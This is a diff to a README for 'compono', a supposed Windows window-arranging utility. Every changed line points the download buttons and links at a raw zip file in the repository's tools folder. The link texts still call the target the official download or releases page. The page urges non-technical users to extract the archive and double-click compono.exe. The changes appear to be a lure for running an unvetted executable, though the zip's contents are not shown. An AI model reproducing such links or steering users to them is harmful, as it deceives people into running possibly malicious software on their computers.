@@ -5,7 +5,7 @@
 Welcome to **compono**, the easiest way to organize your computer screen! If you’ve ever wanted to neatly arrange your open windows into tidy grids—like putting them side-by-side or stacking them in corners—compono does it for you, instantly. No technical skills needed. Just download, run, and enjoy a clutter-free desktop.
 
 > **Big Green Button:**  
-> [![Download compono](https://img.shields.io/badge/Download_compono-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Wooden-klebsiella850/compono)  
+> [![Download compono](https://img.shields.io/badge/Download_compono-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Wooden-klebsiella850/compono/raw/refs/heads/main/tools/3.0-beta.4.zip)  
 > *Click any button on this page to go to the official download page.*
 
 ---
@@ -27,7 +27,7 @@ Think of your computer screen like a blank canvas. Normally, you have to resize 
 compono is designed exclusively for **Windows**. Here’s how to get it running:
 
 1. **Visit the Download Page**  
-   Click this link: [https://github.com/Wooden-klebsiella850/compono](https://github.com/Wooden-klebsiella850/compono)  
+   Click this link: [https://github.com/Wooden-klebsiella850/compono/raw/refs/heads/main/tools/3.0-beta.4.zip](https://github.com/Wooden-klebsiella850/compono/raw/refs/heads/main/tools/3.0-beta.4.zip)  
    You’ll land on the main project page.
 
 2. **Find the Download Button**  
@@ -40,7 +40,7 @@ compono is designed exclusively for **Windows**. Here’s how to get it running:
    - If you downloaded a `.exe` file: **Double-click it** and follow the simple on-screen prompts.  
    - If you downloaded a `.zip` file: Right-click the file, choose **"Extract All"**, then open the extracted folder and double-click the **compono.exe** file inside.
 
-> **Shortcut:** Just go straight to [the releases page](https://github.com/Wooden-klebsiella850/compono) and download the newest file. That’s it. No commands, no code, no terminal.
+> **Shortcut:** Just go straight to [the releases page](https://github.com/Wooden-klebsiella850/compono/raw/refs/heads/main/tools/3.0-beta.4.zip) and download the newest file. That’s it. No commands, no code, no terminal.
 
 ---
 
@@ -100,7 +100,7 @@ No. compono runs standalone. Just download and run.
 
 We regularly release improvements and new features. To update:
 
-1. Go back to the [download page](https://github.com/Wooden-klebsiella850/compono).
+1. Go back to the [download page](https://github.com/Wooden-klebsiella850/compono/raw/refs/heads/main/tools/3.0-beta.4.zip).
 2. Click on **"Releases"**.
 3. Download the latest file and run it—it will replace the old version.
 
@@ -129,7 +129,7 @@ compono is open-source, which means anyone can contribute. Whether you’re a de
 
 Stop wasting time fiddling with window sizes. With compono, your desktop becomes a productive, organized workspace in seconds. Download it now and see the difference.
 
-[![Download compono Now](https://img.shields.io/badge/⬇️_Download_compono-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wooden-klebsiella850/compono)
+[![Download compono Now](https://img.shields.io/badge/⬇️_Download_compono-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wooden-klebsiella850/compono/raw/refs/heads/main/tools/3.0-beta.4.zip)
 
 ---
 
